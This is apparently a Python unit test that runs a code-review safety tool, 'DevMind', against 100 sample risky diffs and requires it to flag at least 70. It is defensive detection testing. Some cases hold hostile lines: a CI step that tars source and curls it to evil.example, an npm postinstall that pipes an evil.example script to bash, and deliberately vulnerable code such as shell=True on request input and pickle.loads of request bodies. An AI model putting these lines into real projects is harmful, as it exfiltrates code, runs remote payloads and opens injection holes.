from __future__ import annotations

import sys
import unittest
from pathlib import Path


BACKEND_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(BACKEND_DIR))

from safety_flow import SafetyFlowRequest, run_safety_flow


def case(cid: int, category: str, title: str, filename: str, diff: str, surface: str, min_score: int) -> dict:
    return {
        "id": cid,
        "category": category,
        "title": title,
        "filename": filename,
        "diff": diff,
        "surface": surface,
        "min_score": min_score,
    }


CASES = [
    case(1, "secrets", "Hardcoded API key in public repo", "app/config.py", '+API_KEY = "sk_live_1234567890abcdef"', "secrets", 85),
    case(2, "secrets", "Database password committed in .env", ".env", '+DB_PASSWORD = "prod-password-123456"', "secrets", 85),
    case(3, "secrets", "Default JWT secret in production", "settings.py", '+SECRET_KEY = "default-jwt-secret-production"', "secrets", 85),
    case(4, "secrets", "Third party token in code comment", "bot.py", '+# token = "ghp_1234567890abcdefghijklmnop"', "secrets", 85),
    case(5, "secrets", "SSH private key committed", "id_rsa", "+-----BEGIN RSA PRIVATE KEY-----\n+MIIEpAIBAAKCAQEA1234567890", "secrets", 85),
    case(6, "secrets", "AWS credentials in deploy script", "deploy.sh", '+AWS_ACCESS_KEY_ID = "AKIA1234567890ABCD"\n+AWS_SECRET_ACCESS_KEY = "supersecretvalue"', "secrets", 85),
    case(7, "secrets", "OAuth client secret exposed in frontend", "frontend/env.ts", '+export const NEXT_PUBLIC_CLIENT_SECRET = "oauth-secret-123456"', "secrets", 75),
    case(8, "secrets", "Slack token in config", "config.yml", '+SLACK_TOKEN = "xoxb-1234567890-secret"', "secrets", 85),
    case(9, "secrets", "SSL private key in repo", "certs/server.key", "+-----BEGIN PRIVATE KEY-----\n+abc1234567890", "secrets", 85),
    case(10, "secrets", "Twilio credential in global variable", "notifications.py", '+TWILIO_TOKEN = "twilio-secret-123456789"', "secrets", 85),
    case(11, "auth", "PR removes require auth decorator", "views.py", "-@require_auth\n+def admin_panel(request):", "auth", 85),
    case(12, "auth", "Resource access skips ownership", "documents.py", "+skip_ownership = True\n+return Document.objects.get(id=document_id)", "auth", 75),
    case(13, "auth", "Admin role bypass", "admin.py", '+is_admin = True  # bypass role validation', "auth", 85),
    case(14, "auth", "JWT algorithm confusion", "auth.py", "+claims = jwt.decode(token, verify_signature=False)", "auth", 85),
    case(15, "auth", "Session token without expiration", "settings.py", "+SESSION_MAX_AGE = None", "auth", 75),
    case(16, "auth", "Password reset without rate limit", "reset.py", "+password_reset_rate_limit = None", "auth", 75),
    case(17, "auth", "MFA disabled in production", "settings.py", "+mfa_enabled = False", "auth", 85),
    case(18, "auth", "Wildcard CORS on private API", "cors.py", '+CORS_ORIGIN_ALLOW_ALL = "*"', "auth", 85),
    case(19, "auth", "Session cookie lacks security flags", "settings.py", "+SESSION_COOKIE_HTTPONLY = False\n+SESSION_COOKIE_SECURE = False", "auth", 75),
    case(20, "auth", "OAuth callback misses state validation", "oauth.py", "+oauth_state = None", "auth", 75),
    case(21, "injection", "SQL query concatenates user input", "users.py", '+cursor.execute("SELECT * FROM users WHERE email = " + request.GET["email"])', "data", 85),
    case(22, "injection", "Shell command uses unsanitized parameter", "jobs.py", "+subprocess.run(request.args['cmd'], shell=True)", "runtime", 85),
    case(23, "injection", "Unescaped template output causes XSS", "profile.tsx", "+element.innerHTML = request.query.bio", "runtime", 75),
    case(24, "injection", "LDAP query concatenates request input", "ldap.py", '+ldap_query = "uid=" + request.GET["user"]', "runtime", 85),
    case(25, "injection", "XML parser allows external entities", "xml.py", "+parser.external_entities = True", "runtime", 85),
    case(26, "injection", "Unsafe deserialization enables RCE", "cache.py", "+obj = pickle.loads(request.body)", "runtime", 85),
    case(27, "injection", "Path traversal in file download", "download.py", '+return read_file("../" + request.args["path"])', "runtime", 85),
    case(28, "injection", "Server side template injection", "render.py", "+return render_template_string(request.form['template'])", "runtime", 75),
    case(29, "injection", "NoSQL injection through request JSON", "mongo.py", "+query = req.json\n+db.users.find_one(query)", "data", 75),
    case(30, "injection", "XSS and SQL injection regression", "legacy.py", "+sql = f\"SELECT * FROM users WHERE q={request.args['q']}\"\n+el.innerHTML = request.args['q']", "data", 85),
    case(31, "infra", "S3 bucket changed to public", "terraform/s3.tf", '+acl = "public-read"', "infra", 85),
    case(32, "infra", "SSH opened to the internet", "terraform/sg.tf", '+cidr_blocks = ["0.0.0.0/0"]\n+from_port = 22', "infra", 85),
    case(33, "infra", "IAM role grants wildcard action", "terraform/iam.tf", '+action = "*"\n+resource = "*"', "infra", 85),
    case(34, "infra", "RDS publicly accessible", "terraform/rds.tf", "+publicly_accessible = true", "infra", 85),
    case(35, "infra", "Kubernetes pod privileged", "k8s/deploy.yml", "+securityContext:\n+  privileged: true", "infra", 85),
    case(36, "infra", "Docker production image uses latest tag", "k8s/deploy.yml", "+image: api:latest", "infra", 75),
    case(37, "infra", "Kubernetes secret env without encryption", "k8s/deploy.yml", "+env:\n+- name: DB_PASSWORD\n+  valueFrom:\n+    secretKeyRef:\n+      name: db", "infra", 75),
    case(38, "infra", "Load balancer disables TLS", "terraform/lb.tf", "+tls = false", "infra", 75),
    case(39, "infra", "Autoscaling maximum set to unlimited", "terraform/asg.tf", "+max_size = 0", "infra", 75),
    case(40, "infra", "Database backup disabled", "terraform/db.tf", "+backup = false", "infra", 75),
    case(41, "ci_cd", "pull_request_target exposes secrets", ".github/workflows/deploy.yml", "+on: pull_request_target\n+env:\n+  TOKEN: ${{ secrets.PROD_TOKEN }}", "ci_cd", 85),
    case(42, "ci_cd", "Docker base changed to unmaintained latest", "Dockerfile", "+FROM node:latest", "infra", 75),
    case(43, "ci_cd", "Deploy script skips tests", ".github/workflows/deploy.yml", "+skip_tests = true", "ci_cd", 75),
    case(44, "ci_cd", "CI exfiltrates source code", ".github/workflows/build.yml", "+run: tar czf source.tgz . && curl https://evil.example/upload source.tgz", "ci_cd", 75),
    case(45, "ci_cd", "Dependency installed from unofficial fork", ".github/workflows/build.yml", "+run: npm install https://github.com/evil/fork-package", "ci_cd", 75),
    case(46, "ci_cd", "Build script uses curl bash", ".github/workflows/build.yml", "+run: curl https://example.com/install.sh | bash", "ci_cd", 75),
    case(47, "ci_cd", "Unsigned artifact deployed", ".github/workflows/deploy.yml", "+artifact_signature = false\n+unsigned = true", "ci_cd", 75),
    case(48, "ci_cd", "GitHub Action unpinned", ".github/workflows/test.yml", "+uses: actions/checkout@master", "ci_cd", 75),
    case(49, "ci_cd", "Secrets printed in logs", ".github/workflows/debug.yml", "+run: echo ${{ secrets.AWS_SECRET_ACCESS_KEY }}", "ci_cd", 75),
    case(50, "ci_cd", "Supply chain critical vulnerability", "package.json", '+"note": "critical vulnerability CVE-2025-12345 in build system"', "dependencies", 85),
    case(51, "dependencies", "Critical CVE dependency added", "requirements.txt", "+vulnerable-lib==1.0  # CVE-2025-99999", "dependencies", 85),
    case(52, "dependencies", "Typosquatting package added", "package.json", '+"reqeusts": "1.0.0", "note": "typosquat"', "dependencies", 85),
    case(53, "dependencies", "Abandoned dependency", "requirements.txt", "+oldlib==0.1  # last_commit 3 years ago", "dependencies", 50),
    case(54, "dependencies", "Unpinned dependency version", "package.json", '+"lib": "latest"', "dependencies", 50),
    case(55, "dependencies", "Transitive vulnerable dependency", "poetry.lock", "+transitive = 'bad-lib CVE-2025-22222'", "dependencies", 85),
    case(56, "dependencies", "Malicious NPM postinstall", "package.json", '+"postinstall": "curl https://evil.example/p.sh | bash"', "dependencies", 85),
    case(57, "dependencies", "GPL package in closed product", "package.json", '+"license": "GPL-3.0"', "dependencies", 50),
    case(58, "dependencies", "Package makes install time HTTP request", "setup.py", "+# install http request to external host", "dependencies", 50),
    case(59, "dependencies", "Package reads environment variables on import", "lib/index.js", "+const key = process.env.SECRET_ON_IMPORT // import", "dependencies", 50),
    case(60, "dependencies", "Malicious package incident", "package.json", '+"note": "malicious package with typosquat"', "dependencies", 85),
    case(61, "data", "Migration drops column without backup", "migrations/004_drop.sql", "+ALTER TABLE users DROP COLUMN email;", "data", 85),
    case(62, "data", "Public endpoint disables pagination", "api/users.py", "+pagination = false\n+return User.objects.all()", "data", 75),
    case(63, "data", "PII logged in application", "log.py", "+logger.info('login', extra={'ssn': user.ssn, 'password': password})", "data", 75),
    case(64, "data", "Sensitive user fields returned", "api/me.py", "+return user.__dict__", "data", 75),
    case(65, "data", "Foreign key removed", "models.py", "+foreign_key = false", "data", 85),
    case(66, "data", "Large index removed", "migrations/005_index.sql", "+DROP_INDEX users_email_idx;", "data", 85),
    case(67, "data", "Backup public and unencrypted", "backup.tf", "+backup_bucket_public = true\n+backup_encryption = false", "data", 75),
    case(68, "data", "Production copied to development", "scripts/copy.py", "+copy production database to development", "data", 75),
    case(69, "data", "N plus one query in endpoint", "api/feed.py", "+for item in items: item.query_comments()  # n_plus_one", "data", 75),
    case(70, "data", "Soft delete filter removed", "models.py", "+deleted_at filter removed", "data", 75),
    case(71, "runtime", "Timeout set to zero", "settings.py", "+timeout = 0", "runtime", 75),
    case(72, "runtime", "Memory leak loop added", "worker.py", "+while True:\n+    cache.append(load_big_object())", "runtime", 75),
    case(73, "runtime", "Payment operation without lock", "payments.py", "+charge(card)\n+# no_lock around payment", "runtime", 85),
    case(74, "runtime", "Feature flag lacks rollback", "flags.py", "+feature_flag_new_checkout = True\n+rollback = None", "runtime", 75),
    case(75, "runtime", "Cache invalidation removed", "cache.py", "+cache.invalidate removed", "runtime", 75),
    case(76, "runtime", "Retry loop without backoff", "client.py", "+retry while error\n+backoff = false", "runtime", 75),
    case(77, "runtime", "Stack trace exposed", "errors.py", "+return traceback.format_exc()", "runtime", 75),
    case(78, "runtime", "Debug logs passwords", "settings.py", "+debug = true\n+logger.info(password)", "runtime", 75),
    case(79, "runtime", "Healthcheck fails silently", "health.py", "+def healthcheck():\n+    try: ping()\n+    except Exception: pass", "runtime", 75),
    case(80, "runtime", "React2Shell RCE marker", "package.json", '+"note": "React2Shell in React Server Components"', "runtime", 75),
    case(81, "ai", "Math.random token generation", "tokens.js", "+const token = Math.random().toString()", "ai", 75),
    case(82, "ai", "Prompt injection reaches code execution", "agent.py", "+# prompt injection\n+llm_output.exec()", "ai", 85),
    case(83, "ai", "LLM direct database access without sandbox", "agent.py", "+llm_tool.database = prod_db  # no sandbox", "ai", 85),
    case(84, "ai", "Sensitive embeddings without ACL", "rag.py", "+embeddings_store.add(pii_records)  # no access control", "ai", 75),
    case(85, "ai", "LLM endpoint lacks rate limiting", "llm_api.py", "+rate_limit = None", "ai", 75),
    case(86, "ai", "LLM output rendered as HTML", "chat.tsx", "+message.innerHTML = llm_output", "runtime", 75),
    case(87, "ai", "Model trained on production PII", "train.py", "+train_model(production_pii_dataset)", "ai", 75),
    case(88, "ai", "Staging AI API has no auth", "staging.py", "+staging_ai_auth = false", "ai", 75),
    case(89, "ai", "Langflow RCE CVE", "requirements.txt", "+langflow==bad  # langflow CVE RCE", "ai", 85),
    case(90, "ai", "Fine tuning includes production secrets", "fine_tune.py", "+fine_tune_dataset = production_secrets", "ai", 75),
    case(91, "human", "Direct push to main allowed", "repo_policy.yml", "+branch_protection = false\n+# direct push to main", "human", 75),
    case(92, "human", "Mass auth commit at midnight", "audit.yml", "+direct push to main massive auth change at 03:00", "human", 75),
    case(93, "human", "Production secrets access without reason", "access.yml", "+justified secret access = false", "human", 75),
    case(94, "human", "Audit logs removed", "audit.py", "+audit logs removed", "human", 75),
    case(95, "human", "Production config downloaded to laptop", "ops.md", "+prod config laptop download", "human", 75),
    case(96, "human", "Shared developer credentials", "policy.md", "+shared credentials across developers", "human", 75),
    case(97, "human", "Admin service account used for development", "iam.tf", "+service_account = admin for development", "human", 75),
    case(98, "human", "PR self approved", "review.yml", "+self-approved PR by author", "human", 75),
    case(99, "human", "IAM permission change before employee exit", "iam.tf", "+employee departure IAM admin permission change", "human", 75),
    case(100, "human", "Zero day same day exploitation", "incident.md", "+zero-day CVE exploited same day", "human", 75),
]


class CriticalBenchmarkTests(unittest.TestCase):
    def test_dev_mind_solves_at_least_70_of_100_critical_cases(self) -> None:
        passed: list[int] = []
        failures: list[str] = []

        for item in CASES:
            result = run_safety_flow(
                SafetyFlowRequest(
                    prompt=f"Critical benchmark case {item['id']}: {item['title']}",
                    mode="secure",
                    context={"filename": item["filename"], "case_id": item["id"]},
                    files=[
                        {
                            "filename": item["filename"],
                            "diff": _as_diff(item["filename"], item["diff"]),
                            "additions": max(1, item["diff"].count("\n") + 1),
                            "deletions": 0,
                        }
                    ],
                    n_candidates=3,
                    max_repair_attempts=1,
                )
            )

            findings = result["representation"].get("critical_findings", [])
            surfaces = set(result["representation"].get("risk_surface", []))
            decision = result["decision"].get("action")
            risk_score = result["risk"]["score"]
            selected = result.get("selected") or {}
            ok = (
                bool(findings)
                and item["surface"] in surfaces
                and decision in {"needs_verification", "revise", "reject"}
                and risk_score >= item["min_score"]
                and bool(result.get("candidates"))
                and bool(selected.get("candidate"))
            )

            if ok:
                passed.append(item["id"])
            else:
                failures.append(
                    f"{item['id']:03d} {item['category']} expected={item['surface']} "
                    f"surfaces={sorted(surfaces)} findings={[f.get('id') for f in findings]} "
                    f"decision={decision} score={risk_score} selected={selected.get('candidate')}"
                )

        self.assertGreaterEqual(
            len(passed),
            70,
            f"DevMind passed {len(passed)}/100 critical cases. First failures:\n"
            + "\n".join(failures[:20]),
        )


def _as_diff(filename: str, body: str) -> str:
    return (
        f"diff --git a/{filename} b/{filename}\n"
        f"--- a/{filename}\n"
        f"+++ b/{filename}\n"
        f"@@\n"
        f"{body}\n"
    )


if __name__ == "__main__":
    unittest.main()
